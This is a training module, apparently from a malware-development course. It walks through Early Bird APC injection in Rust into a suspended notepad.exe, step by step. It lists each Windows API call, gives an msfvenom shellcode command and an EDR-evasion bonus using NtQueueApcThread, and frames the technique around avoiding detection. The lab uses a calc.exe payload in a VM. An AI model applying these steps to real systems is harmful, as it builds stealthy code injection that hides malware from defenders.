# Module 14 — APC Injection & Early Bird

## Concept

An **Asynchronous Procedure Call (APC)** is a function queued to a specific thread that executes when the thread enters an *alertable wait state* — a blocking call that passes `ALERTABLE = TRUE`, such as `SleepEx`, `WaitForSingleObjectEx`, or `MsgWaitForMultipleObjectsEx`. The kernel drains the APC queue before returning control to the thread.

The **Early Bird** pattern exploits a specific alertable moment: when the main thread of a newly-created-suspended process is first resumed, the Windows loader calls `NtTestAlert` before running any user code. This drains the APC queue — meaning any APC queued before `ResumeThread` runs *before* a single instruction of `notepad.exe` executes.

This technique avoids `CreateRemoteThread` entirely. No new thread appears in the process. Execution of your shellcode happens inside the target's own main thread, making it appear to originate from a legitimate call stack.

### Execution primitive comparison

| Property | CreateRemoteThread | NtCreateThreadEx | APC (Early Bird) |
|---|---|---|---|
| New thread created | Yes | Yes | No |
| Target state required | Process already running | Process already running | Process suspended (Early Bird) |
| Detectability | High — well-known API, logged by EDR | Medium — NT level, less visible | Low — no new thread, fires in existing thread |
| Thread enumeration shows it | Yes (foreign thread) | Yes | No |
| Win32 event logged | Yes | Partial | Partial (`QueueUserAPC` vs `NtQueueApcThread`) |
| Requires suspended spawn | No | No | Yes (for Early Bird) |

---

## The injection sequence

1. `CreateProcessA` — spawn `notepad.exe` with `CREATE_SUSPENDED`.
2. `VirtualAllocEx` — allocate RWX memory in the remote process for the shellcode.
3. `WriteProcessMemory` — copy the shellcode into the allocation.
4. `QueueUserAPC` — queue the shellcode address as an APC on the suspended main thread.
5. `ResumeThread` — the thread wakes up, `NtTestAlert` drains the APC queue, shellcode fires.
6. `WaitForSingleObject` — wait for the host process to exit.

---

## Task

Implement the injector in six steps. The skeleton in `src/main.rs` has a `todo!()` for each step.

### Step 1 — Launch the host process suspended

```
CreateProcessA(
    lpapplicationname: PCSTR,                              // full path or name of exe — b"notepad.exe\0"
    lpcommandline: PSTR,                                   // None if lpapplicationname is set
    lpprocessattributes: Option<*const SECURITY_ATTRIBUTES>, // None — default security
    lpthreadattributes: Option<*const SECURITY_ATTRIBUTES>,  // None — default security
    binherithandles: BOOL,                                 // false — don't inherit handles
    dwcreationflags: PROCESS_CREATION_FLAGS,               // CREATE_SUSPENDED — thread paused at creation
    lpenvironment: Option<*const c_void>,                  // None — inherit parent's environment
    lpcurrentdirectory: PCSTR,                             // None — inherit parent's working directory
    lpstartupinfo: *const STARTUPINFOA,                    // &si — cb field must equal size_of::<STARTUPINFOA>()
    lpprocessinformation: *mut PROCESS_INFORMATION,        // &mut pi — receives hProcess and hThread
) -> Result<()>
```

After this call: `pi.hProcess` is a handle to the suspended process; `pi.hThread` is a handle to its suspended main thread. Both are used in every subsequent step.

### Step 2 — Allocate RWX memory in the remote process

```
VirtualAllocEx(
    hprocess: HANDLE,                          // pi.hProcess — the suspended notepad
    lpaddress: Option<*const c_void>,          // None — let the OS choose the address
    dwsize: usize,                             // SHELLCODE.len() — exactly as many bytes as needed
    flallocationtype: VIRTUAL_ALLOCATION_TYPE, // MEM_COMMIT | MEM_RESERVE — commit immediately
    flprotect: PAGE_PROTECTION_FLAGS,          // PAGE_EXECUTE_READWRITE — shellcode needs RWX
) -> *mut c_void                               // address in the remote process; NULL on failure
```

Save the returned pointer as `remote_buf`. Check it for NULL.

### Step 3 — Write the shellcode into the remote allocation

```
WriteProcessMemory(
    hprocess: HANDLE,                              // pi.hProcess
    lpbaseaddress: *const c_void,                  // remote_buf — where to write in the target
    lpbuffer: *const c_void,                       // SHELLCODE.as_ptr() as *const c_void
    nsize: usize,                                  // SHELLCODE.len()
    lpnumberofbyteswritten: Option<*mut usize>,    // None
) -> Result<()>
```

### Step 4 — Queue an APC to the suspended main thread

```
QueueUserAPC(
    pfnapc: PAPCFUNC,   // the shellcode address cast to a function pointer
    hthread: HANDLE,    // pi.hThread — the suspended main thread of notepad.exe
    dwdata: usize,      // 0 — parameter passed to the APC routine (unused by calc shellcode)
) -> u32               // non-zero = success; 0 = failure (check GetLastError)
```

`PAPCFUNC` is `Option<unsafe extern "system" fn(usize)>`. To convert `remote_buf` to this type:

```
let apc_func: PAPCFUNC = mem::transmute(remote_buf);
```

Both are 8-byte values on x64, so `transmute` is safe here.

### Step 5 — Resume the thread

```
ResumeThread(
    hthread: HANDLE,  // pi.hThread — the suspended main thread
) -> u32             // previous suspend count (1 = was suspended once); 0xFFFFFFFF on failure
```

The moment this returns, the thread is runnable. The OS will call `NtTestAlert` during thread initialization, draining the APC queue. Your shellcode fires before any instruction of `notepad.exe` runs.

### Step 6 — Wait for the process to finish

```
WaitForSingleObject(
    hhandle: HANDLE,      // pi.hProcess — the notepad process object
    dwmilliseconds: u32,  // INFINITE — wait until the process exits
) -> WIN32_ERROR
```

---

## Bonus: NtQueueApcThread

`QueueUserAPC` is a Win32 wrapper around the NT function `NtQueueApcThread`. Some EDR products log `QueueUserAPC` at the Win32 layer. Calling the NT function directly avoids that layer.

```
NtQueueApcThread(             // from ntapi::ntpsapi
    ThreadHandle: HANDLE,     // pi.hThread
    ApcRoutine: PPS_APC_ROUTINE, // mem::transmute(remote_buf)
    ApcArgument1: PVOID,      // 0 as *mut c_void — first argument to the APC routine
    ApcArgument2: PVOID,      // 0 as *mut c_void — second argument (unused)
    ApcArgument3: PVOID,      // 0 as *mut c_void — third argument (unused)
) -> i32 (NTSTATUS)           // 0 = STATUS_SUCCESS
```

Replace step 4 with this call and observe whether Task Manager or Process Monitor report anything differently.

---

## Acceptance Criteria

- [ ] `cargo build --target x86_64-pc-windows-gnu -p apc-injection` compiles without errors
- [ ] Running `apc-injection.exe` on the VM opens `calc.exe`
- [ ] The host process appears as `notepad.exe` in Task Manager
- [ ] No new threads appear in Process Explorer before calc.exe launches (compare with module 02)
- [ ] `VirtualAllocEx` NULL return is checked
- [ ] `QueueUserAPC` failure (return 0) is detected and handled
- [ ] `ResumeThread` failure (`0xFFFFFFFF`) is detected
- [ ] All `Result<()>` returns from `windows` crate functions are handled (`.unwrap()` or `?`)

---

## Key Types

**`PAPCFUNC`** — `Option<unsafe extern "system" fn(usize)>`. The type `QueueUserAPC` expects for the APC routine. On x64, all pointers are 8 bytes, so `mem::transmute(remote_buf: *mut c_void)` produces a valid `PAPCFUNC`. Import from `windows::Win32::System::Threading`.

**`PROCESS_INFORMATION`** — filled by `CreateProcessA`. Fields: `hProcess` (process handle), `hThread` (main thread handle), `dwProcessId`, `dwThreadId`. You use both handles; close them after `WaitForSingleObject` returns.

**`STARTUPINFOA`** — passed to `CreateProcessA`. Set `cb = mem::size_of::<STARTUPINFOA>() as u32` before the call; zero the rest with `..Default::default()`.

---

## How it differs from modules 02 and 04

| | Module 02 | Module 04 | Module 14 |
|---|---|---|---|
| Target process | Existing, running | We create it suspended | We create it suspended |
| Execution start | `CreateRemoteThread` | `ResumeThread` (entry thread) | `ResumeThread` → APC drains |
| New thread visible | Yes | No (existing thread redirected) | No (APC on existing thread) |
| Process name shown | target's | Our decoy | Our decoy |

---

## Hints

- `mem::transmute` requires both sides to have the same size. On x64, `*mut c_void` and `fn(usize)` are both 8 bytes. It compiles and is safe in this narrow context.
- If `QueueUserAPC` returns 0, `GetLastError()` will tell you why. The most common cause is an invalid thread handle or a thread that is already terminated.
- You **must** call `QueueUserAPC` *before* `ResumeThread`. If you reverse the order, the thread may already be past `NtTestAlert` and the APC will never fire (or will only fire if the thread later does an alertable wait, which for a GUI app is unpredictable).
- The shellcode in `SHELLCODE` is a placeholder. On your VM, generate a fresh one: `msfvenom -p windows/x64/exec CMD=calc.exe -f rust`. Paste the array over the placeholder.
- Compare task manager / Process Explorer before and after running this vs. module 02. With module 02, a foreign thread briefly appears. With Early Bird, it doesn't.

---

## Submission

Paste `14-apc-injection/src/main.rs` and ask for a review.
